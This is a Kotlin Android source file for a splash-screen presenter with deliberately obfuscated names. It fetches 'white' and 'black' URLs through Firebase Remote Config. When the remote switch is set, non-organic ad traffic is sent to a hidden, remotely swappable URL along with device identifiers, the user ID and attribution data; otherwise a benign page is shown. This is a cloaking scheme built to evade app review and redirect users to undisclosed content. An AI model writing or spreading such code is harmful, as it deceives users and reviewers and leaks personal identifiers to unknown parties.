package com.pamach.rimach.com.SplashActivity32hjk1

import android.net.Uri
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.pamach.rimach.com.URLStuff32hjk1.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class SplashPresenter32hjk1(private val splashActivityMethods32hjk: SplashActivityContract32hjk1.SplashActivityMethods32hjk) :
    SplashActivityContract32hjk1.SplashActivityPresenterMethods32hjk1 {

    private var finalString32jkl1: String? = null

    override fun thisEndsHere32hjk1() {
        splashActivityMethods32hjk.onClickListener32hjk1 {
            CoroutineScope(Dispatchers.Main).launch {
                delay(5000)
                finalString32jkl1 =
                    if (fbBlackValue32hjk1 == null || fbBlackValue32hjk1 == "empty") {
                        fbWhiteValue32hjk1 ?: return@launch
                    } else {
                        if (status32hjk1 == "Non-organic") {
                            if (key32hjk1.toString().length != 20) {
                                Uri.parse(fbBlackValue32hjk1).buildUpon()
                                    .appendQueryParameter("key", fbDefaultValue32hjk1)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashActivityMethods32hjk.getPackageName32hjk1()
                                    )
                                    .appendQueryParameter("sub4", adGroup32hjk1)
                                    .appendQueryParameter("sub5", adSet32hjk1)
                                    .appendQueryParameter("sub6", afChannel32hjk1)
                                    .appendQueryParameter("sub7", "Default")
                                    .toString()
                                    .plus(
                                        "&sub10=$uid32hjk1||$AID32hjk1||${
                                            decodeString32hjk1(CODE_APPSFLYER_32hjk1)
                                        }"
                                    )

                            } else {
                                Uri.parse(fbBlackValue32hjk1).buildUpon()
                                    .appendQueryParameter("key", key32hjk1)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashActivityMethods32hjk.getPackageName32hjk1()
                                    )
                                    .appendQueryParameter("sub2", sub232hjk1)
                                    .appendQueryParameter("sub3", sub332hjk1)
                                    .appendQueryParameter("sub4", adGroup32hjk1)
                                    .appendQueryParameter("sub5", adSet32hjk1)
                                    .appendQueryParameter("sub6", afChannel32hjk1)
                                    .appendQueryParameter("sub7", mediaSource32hjk1)
                                    .toString()
                                    .plus(
                                        "&sub10=$uid32hjk1||$AID32hjk1||${
                                            decodeString32hjk1(CODE_APPSFLYER_32hjk1)
                                        }"
                                    )

                            }
                        } else {
                            Uri.parse(fbBlackValue32hjk1).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue32hjk1)
                                .appendQueryParameter(
                                    "bundle",
                                    splashActivityMethods32hjk.getPackageName32hjk1()
                                )
                                .appendQueryParameter("sub7", "Organic")
                                .toString()
                                .plus(
                                    "&sub10=$uid32hjk1||$AID32hjk1||${
                                        decodeString32hjk1(CODE_APPSFLYER_32hjk1)
                                    }"
                                )

                        }
                    }
                splashActivityMethods32hjk.startNewIntentWithURL32hjk1(
                    finalString32jkl1 ?: return@launch
                )
            }
        }
    }

    override fun setupFB32hjk1() {
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_32hjk1 to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue32hjk1 = getString(FB_BLACK_KEY_32hjk1)
                    fbDefaultValue32hjk1 = getString(FB_DEFAULT_KEY_32hjk1)
                    fbWhiteValue32hjk1 = getString(FB_WHITE_KEY_32hjk1)
                }
            }
        }
    }
}

